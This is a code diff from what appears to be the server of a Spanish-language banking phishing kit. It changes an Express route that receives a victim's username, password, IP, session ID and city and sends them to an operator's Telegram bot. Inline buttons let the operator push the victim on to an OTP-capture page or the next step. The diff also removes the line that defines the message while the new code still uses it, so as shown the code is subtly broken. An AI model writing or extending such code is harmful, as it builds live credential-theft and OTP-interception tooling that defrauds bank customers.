@@ -106,9 +106,53 @@ app.post('/virtualpersona', async (req, res) => {
     });
 
   
-const message = `📲 NUEVO ACCESO VIRTUAL\n\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n🆔 SessionID: ${sessionId}\n📍 Ciudad: ${city} - ${country}`; 
+try {
+  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "🔁 Error Logo",
+              callback_data: JSON.stringify({
+                sessionId,
+                action: 'redirect',
+                redirect_to: 'Virtual-Persona.html'
+              })
+            },
+            {
+              text: "🔁 Error OTP",
+              callback_data: JSON.stringify({
+                sessionId,
+                action: 'redirect',
+                redirect_to: 'otp-check.html'
+              })
+            }
+          ],
+          [
+            {
+              text: "✅ Siguiente",
+              callback_data: JSON.stringify({
+                sessionId,
+                action: 'redirect',
+                redirect_to: 'opcion1.html'
+              })
+            }
+          ]
+        ]
+      }
+    })
+  });
 
-await tgSendMessage(message, buttonsForStep('virtual', sessionId));
+  const data = await res.json();
+  console.log("✅ Enviado a Telegram:", data);
+} catch (error) {
+  console.error("❌ Error al enviar a Telegram:", error);
+}
 
 
 
